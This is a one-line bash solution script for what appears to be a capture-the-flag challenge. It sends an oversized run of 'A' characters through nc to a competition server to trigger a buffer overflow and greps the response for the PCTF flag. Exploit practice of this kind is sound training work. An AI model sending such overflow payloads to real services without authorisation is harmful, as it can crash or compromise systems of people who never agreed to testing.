#!/bin/bash

python -c "import sys; sys.stdout.buffer.write(b'A'*301+b'\n')" | nc chal.pctf.competitivecyber.club 9999 | grep -o "PCTF{.*}"
